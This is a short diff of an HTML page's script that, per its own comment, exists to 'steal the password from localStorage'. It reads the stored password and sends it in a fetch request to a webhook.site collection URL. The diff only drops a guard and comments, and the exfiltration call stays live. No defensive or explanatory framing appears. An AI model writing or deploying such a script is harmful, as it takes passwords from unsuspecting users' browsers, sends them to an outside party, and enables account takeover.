@@ -9,12 +9,8 @@
         // We just need to steal the password from localStorage                                                             
                                                                                                                             
         // Get the password                                                                                                 
-        const password = localStorage.getItem('password');                                                                  
-                                                                                                                            
-        // Send it to our webhook                                                                                           
-        if (password) {                                                                                                     
-            fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?password=' + encodeURIComponent(password));                                                                                                     
-        }                                                                                                                   
+        const password = localStorage.getItem('password');                                                                                               
+            fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?password=' + encodeURIComponent(password));                                                                                                                                                                                            
     </script>                                                                                                               
 </body>                                                                                                                     
 </html>  
